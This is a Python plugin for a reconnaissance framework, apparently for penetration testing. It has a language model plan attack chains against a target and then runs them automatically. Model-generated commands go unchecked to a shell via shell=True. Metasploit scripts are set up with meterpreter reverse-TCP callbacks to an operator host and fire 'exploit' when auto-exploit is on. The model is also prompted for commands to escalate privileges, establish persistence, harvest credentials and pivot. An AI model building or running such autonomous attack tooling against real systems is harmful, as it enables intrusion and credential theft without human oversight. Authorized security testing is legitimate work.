#!/usr/bin/python3

import asyncio
import os
import json
import subprocess
import tempfile
from datetime import datetime
from autorecon.plugins import AttackScan
from autorecon.ai_service import get_ai_assistant

class AIAttackOrchestrator(AttackScan):
    """AI-powered attack orchestrator that automates penetration testing workflows."""

    def __init__(self):
        super().__init__()
        self.name = "AI Attack Orchestrator"
        self.description = "Uses AI to analyze targets and orchestrate automated attack chains"
        self.attack_type = 'orchestration'
        self.tags = ['ai', 'attack', 'automation', 'orchestration']
        self.priority = 1
        self.risk_level = 'high'
        self.requires_confirmation = True
        
        # Plugin options
        self.add_option('target-info', help='Path to JSON file with target reconnaissance data')
        self.add_option('attack-objectives', default='full-compromise', help='Attack objectives (recon,access,persistence,exfiltration,full-compromise)')
        self.add_option('risk-tolerance', default='medium', help='Risk tolerance level (low,medium,high,critical)')
        self.add_option('time-limit', default='3600', help='Maximum time for attack chain in seconds. Default: %(default)s')
        self.add_option('ai-model', default='llama3.1', help='AI model to use for orchestration. Default: %(default)s')
        self.add_true_option('interactive', help='Enable interactive mode for AI guidance')
        self.add_true_option('auto-exploit', help='Automatically execute exploits when found')
        self.add_true_option('auto-escalate', help='Automatically attempt privilege escalation')
        self.add_true_option('generate-payloads', help='Generate custom payloads using AI')
        self.add_option('lhost', help='Local host IP for reverse shells and callbacks')
        self.add_option('lport', default='4444', help='Local port for reverse shells. Default: %(default)s')
        self.add_option('msf-workspace', help='Metasploit workspace name')

    async def run(self, service):
        """Execute AI-powered attack orchestration."""
        try:
            self.info("Starting AI-powered attack orchestration...")
            
            # Get AI assistant
            ai_assistant = get_ai_assistant(model=self.get_option('ai_model'))
            
            # Load target reconnaissance data
            recon_data = self._load_reconnaissance_data()
            if not recon_data:
                self.warn("No reconnaissance data found. Running basic target analysis...")
                recon_data = await self._perform_basic_recon(service)
            
            # Analyze target and generate attack strategy
            attack_strategy = await ai_assistant.suggest_attack_chain(recon_data)
            
            # Execute attack chain
            results = await self._execute_attack_chain(attack_strategy, recon_data, ai_assistant)
            
            # Save comprehensive results
            await self._save_orchestration_results(service, attack_strategy, results)
            
            # Interactive mode for additional guidance
            if self.get_option('interactive'):
                await self._interactive_guidance(service, recon_data, results, ai_assistant)
            
            self.info("Attack orchestration completed successfully")
            
        except Exception as e:
            self.error(f"Attack orchestration failed: {e}")

    def _load_reconnaissance_data(self) -> dict:
        """Load target reconnaissance data from file."""
        recon_file = self.get_option('target_info')
        if not recon_file or not os.path.exists(recon_file):
            return {}

        try:
            with open(recon_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.warn(f'Failed to load reconnaissance data: {e}')
            return {}

    async def _perform_basic_recon(self, service) -> dict:
        """Perform basic reconnaissance if no data is provided."""
        self.info("Performing basic target reconnaissance...")
        
        basic_recon = {
            'target': str(service.target),
            'ports': [service.port] if hasattr(service, 'port') else [],
            'services': [service.name] if hasattr(service, 'name') else [],
            'timestamp': datetime.now().isoformat(),
            'reconnaissance_level': 'basic'
        }
        
        # Basic port scan
        if hasattr(service, 'target'):
            nmap_command = f"nmap -sS -sV -O {service.target}"
            try:
                result = subprocess.run(nmap_command.split(), capture_output=True, text=True, timeout=300)
                basic_recon['nmap_output'] = result.stdout
            except Exception as e:
                self.warn(f"Basic nmap scan failed: {e}")
        
        return basic_recon

    async def _execute_attack_chain(self, attack_strategy: list, recon_data: dict, ai_assistant) -> dict:
        """Execute the AI-generated attack chain."""
        results = {
            'attack_chain': attack_strategy,
            'executed_steps': [],
            'successful_exploits': [],
            'failed_attempts': [],
            'credentials_found': [],
            'shells_obtained': [],
            'privilege_level': 'none',
            'persistence_established': False,
            'data_exfiltrated': [],
            'timestamp': datetime.now().isoformat()
        }
        
        start_time = datetime.now()
        time_limit = int(self.get_option('time_limit'))
        
        for i, step in enumerate(attack_strategy):
            # Check time limit
            elapsed = (datetime.now() - start_time).seconds
            if elapsed > time_limit:
                self.warn(f"Time limit ({time_limit}s) reached. Stopping attack chain.")
                break
            
            self.info(f"Executing attack step {i+1}/{len(attack_strategy)}: {step.get('step', 'Unknown')}")
            
            step_result = await self._execute_attack_step(step, recon_data, ai_assistant)
            results['executed_steps'].append(step_result)
            
            # Process results
            if step_result['status'] == 'success':
                results['successful_exploits'].append(step_result)
                
                # Check for specific achievements
                if 'shell' in step_result.get('output', '').lower():
                    results['shells_obtained'].append(step_result)
                    
                if 'root' in step_result.get('output', '').lower() or 'administrator' in step_result.get('output', '').lower():
                    results['privilege_level'] = 'admin'
                elif 'user' in step_result.get('output', '').lower():
                    results['privilege_level'] = 'user'
                    
            else:
                results['failed_attempts'].append(step_result)
            
            # Small delay between steps
            await asyncio.sleep(2)
        
        return results

    async def _execute_attack_step(self, step: dict, recon_data: dict, ai_assistant) -> dict:
        """Execute a single attack step."""
        step_result = {
            'step': step.get('step', 'Unknown'),
            'commands': step.get('commands', []),
            'tools': step.get('tools', []),
            'status': 'pending',
            'output': '',
            'error': '',
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # Execute commands in the step
            for command in step.get('commands', []):
                if not command.strip():
                    continue
                    
                self.info(f"Executing command: {command}")
                
                # Handle different types of commands
                if command.startswith('msfconsole'):
                    output = await self._execute_metasploit_command(command, recon_data)
                elif command.startswith(('nmap', 'hydra', 'sqlmap')):
                    output = await self._execute_tool_command(command)
                else:
                    output = await self._execute_generic_command(command)
                
                step_result['output'] += f"\n{output}"
            
            step_result['status'] = 'success'
            
        except Exception as e:
            step_result['status'] = 'failed'
            step_result['error'] = str(e)
            self.warn(f"Attack step failed: {e}")
        
        return step_result

    async def _execute_metasploit_command(self, command: str, recon_data: dict) -> str:
        """Execute Metasploit command with enhanced automation."""
        try:
            # Generate Metasploit resource script
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                # Basic setup
                f.write("workspace -a " + (self.get_option('msf_workspace') or 'autorecon') + "\n")
                
                # Parse and enhance command
                if 'use ' in command:
                    module = command.split('use ')[1].strip()
                    f.write(f"use {module}\n")
                    
                    # Auto-configure common options
                    target_ip = str(recon_data.get('target', ''))
                    if target_ip:
                        f.write(f"set RHOSTS {target_ip}\n")
                    
                    lhost = self.get_option('lhost')
                    if lhost:
                        f.write(f"set LHOST {lhost}\n")
                    
                    lport = self.get_option('lport')
                    if lport:
                        f.write(f"set LPORT {lport}\n")
                    
                    # Auto-select payload if not specified
                    if 'windows' in module:
                        f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
                    elif 'linux' in module:
                        f.write("set PAYLOAD linux/x86/meterpreter/reverse_tcp\n")
                    
                    f.write("show options\n")
                    
                    # Execute if auto-exploit is enabled
                    if self.get_option('auto_exploit'):
                        f.write("exploit\n")
                    else:
                        f.write("check\n")
                
                rc_file = f.name
            
            # Execute Metasploit with resource script
            msf_command = f"msfconsole -q -r {rc_file}"
            result = subprocess.run(msf_command.split(), capture_output=True, text=True, timeout=300)
            
            # Cleanup
            os.unlink(rc_file)
            
            return result.stdout
            
        except Exception as e:
            self.error(f"Metasploit execution failed: {e}")
            return f"Error: {e}"

    async def _execute_tool_command(self, command: str) -> str:
        """Execute penetration testing tool command."""
        try:
            self.info(f"Executing tool command: {command}")
            result = subprocess.run(command.split(), capture_output=True, text=True, timeout=300)
            return result.stdout
        except subprocess.TimeoutExpired:
            return "Command timed out after 300 seconds"
        except Exception as e:
            return f"Error executing command: {e}"

    async def _execute_generic_command(self, command: str) -> str:
        """Execute generic system command."""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"

    async def _interactive_guidance(self, service, recon_data: dict, results: dict, ai_assistant):
        """Provide interactive AI guidance for next steps."""
        self.info("Entering interactive AI guidance mode...")
        
        # Analyze current results
        context = {
            'target': str(service.target) if hasattr(service, 'target') else 'unknown',
            'reconnaissance': recon_data,
            'attack_results': results,
            'successful_exploits': len(results['successful_exploits']),
            'privilege_level': results['privilege_level'],
            'shells_obtained': len(results['shells_obtained'])
        }
        
        # Generate recommendations
        messages = [
            {"role": "system", "content": "You are a penetration testing expert providing guidance on next steps."},
            {"role": "user", "content": f"Based on these attack results: {json.dumps(context, indent=2)}, what should be the next steps?"}
        ]
        
        recommendations = await ai_assistant.ollama.chat_completion(messages)
        
        self.info("AI Recommendations:")
        self.info(recommendations)
        
        # Generate follow-up commands
        if results['shells_obtained']:
            self.info("Generating post-exploitation commands...")
            post_exploit_commands = await self._generate_post_exploit_commands(ai_assistant, context)
            
            commands_file = os.path.join(self.output_dir, 'post_exploit_commands.txt')
            with open(commands_file, 'w') as f:
                f.write("# AI-Generated Post-Exploitation Commands\n\n")
                for cmd in post_exploit_commands:
                    f.write(f"{cmd}\n")
            
            self.info(f"Post-exploitation commands saved to {commands_file}")

    async def _generate_post_exploit_commands(self, ai_assistant, context: dict) -> list:
        """Generate post-exploitation commands using AI."""
        prompt = f"""Based on successful shell access on this target: {json.dumps(context, indent=2)}
        
        Generate specific post-exploitation commands for:
        1. Privilege escalation
        2. Persistence establishment
        3. Credential harvesting
        4. Network pivoting
        5. Data collection
        
        Provide actual commands that can be executed."""
        
        response = await ai_assistant.ollama.generate_text(prompt)
        
        # Extract commands from response
        commands = []
        lines = response.split('\n')
        for line in lines:
            line = line.strip()
            if line and (line.startswith(('sudo', 'cat', 'ls', 'find', 'whoami', 'id', 'uname')) or '$' in line):
                commands.append(line.replace('$', '').strip())
        
        return commands

    async def _save_orchestration_results(self, service, attack_strategy: list, results: dict):
        """Save comprehensive orchestration results."""
        orchestration_data = {
            'target': str(service.target) if hasattr(service, 'target') else 'unknown',
            'timestamp': datetime.now().isoformat(),
            'configuration': {
                'attack_objectives': self.get_option('attack_objectives'),
                'risk_tolerance': self.get_option('risk_tolerance'),
                'time_limit': self.get_option('time_limit'),
                'ai_model': self.get_option('ai_model'),
                'auto_exploit': self.get_option('auto_exploit'),
                'auto_escalate': self.get_option('auto_escalate')
            },
            'attack_strategy': attack_strategy,
            'execution_results': results,
            'summary': {
                'total_steps': len(attack_strategy),
                'successful_steps': len(results['successful_exploits']),
                'failed_steps': len(results['failed_attempts']),
                'shells_obtained': len(results['shells_obtained']),
                'privilege_level': results['privilege_level'],
                'persistence_established': results['persistence_established']
            }
        }
        
        # Save main results
        results_file = os.path.join(self.output_dir, 'ai_attack_orchestration.json')
        with open(results_file, 'w') as f:
            json.dump(orchestration_data, f, indent=2)
        
        # Save attack timeline
        timeline_file = os.path.join(self.output_dir, 'attack_timeline.txt')
        with open(timeline_file, 'w') as f:
            f.write("# AI-Orchestrated Attack Timeline\n\n")
            for i, step in enumerate(results['executed_steps']):
                f.write(f"Step {i+1}: {step['step']}\n")
                f.write(f"Status: {step['status']}\n")
                f.write(f"Timestamp: {step['timestamp']}\n")
                if step['commands']:
                    f.write("Commands:\n")
                    for cmd in step['commands']:
                        f.write(f"  {cmd}\n")
                f.write("\n")
        
        # Generate summary report
        summary_file = os.path.join(self.output_dir, 'attack_summary.txt')
        with open(summary_file, 'w') as f:
            f.write("# AI-Orchestrated Attack Summary\n\n")
            f.write(f"Target: {orchestration_data['target']}\n")
            f.write(f"Timestamp: {orchestration_data['timestamp']}\n")
            f.write(f"AI Model: {orchestration_data['configuration']['ai_model']}\n\n")
            
            f.write("## Results Summary\n")
            f.write(f"- Total Attack Steps: {orchestration_data['summary']['total_steps']}\n")
            f.write(f"- Successful Steps: {orchestration_data['summary']['successful_steps']}\n")
            f.write(f"- Failed Steps: {orchestration_data['summary']['failed_steps']}\n")
            f.write(f"- Shells Obtained: {orchestration_data['summary']['shells_obtained']}\n")
            f.write(f"- Privilege Level: {orchestration_data['summary']['privilege_level']}\n")
            f.write(f"- Persistence: {orchestration_data['summary']['persistence_established']}\n\n")
            
            if results['successful_exploits']:
                f.write("## Successful Exploits\n")
                for exploit in results['successful_exploits']:
                    f.write(f"- {exploit['step']}\n")
                f.write("\n")
            
            if results['shells_obtained']:
                f.write("## Shells Obtained\n")
                for shell in results['shells_obtained']:
                    f.write(f"- {shell['step']} at {shell['timestamp']}\n")
                f.write("\n")
        
        self.info(f"Orchestration results saved to {self.output_dir}")

    def get_option(self, name):
        """Get plugin option value."""
        return getattr(self.autorecon.args, name.replace('-', '_'), None)